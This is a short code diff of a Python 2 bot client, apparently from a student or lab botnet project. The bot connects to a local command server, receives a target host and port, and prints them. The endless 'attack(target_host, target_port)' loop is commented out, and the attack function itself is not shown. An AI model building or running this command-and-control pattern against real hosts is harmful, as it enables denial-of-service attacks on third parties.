@@ -30,22 +30,12 @@ if __name__ == "__main__":
     server_host = socket.gethostname() # Get local machine name
     server_port = 22222                # Reserve a port for your service.
     s.connect((server_host, server_port))
-    thanks = s.recv(1024)
-    print thanks                # prints 'Thank you for connecting bot 2'
-    #while True:
-    #s.sendall('ACKACKACK')     # bot acknowledges
-    s.sendall('ACKACKACK')      # bot acknowledges
-    s.close()  #urhgiulerghersiugersuggrls#     
-    """
-    print 'Sent ACK'
-    target_host = s.recv(1024)
-    #s.sendall('ACK')
-    #print target_host
-    target_port = int(s.recv(1024))
-    #s.sendall('ACK')
-    print target_port
+    data = s.recv(1024)
+    print data
+    target_host, target_port = data.split()[-2:]
+    target_port = int(target_port)
+    print 'Target Host Address: '+target_host+'\nTarget Port Number: '+str(target_port)
     s.close()                     # Close the socket when done testnew
 
-    while True:
-        attack(target_host, target_port)
-    """
+#    while True:
+#        attack(target_host, target_port)
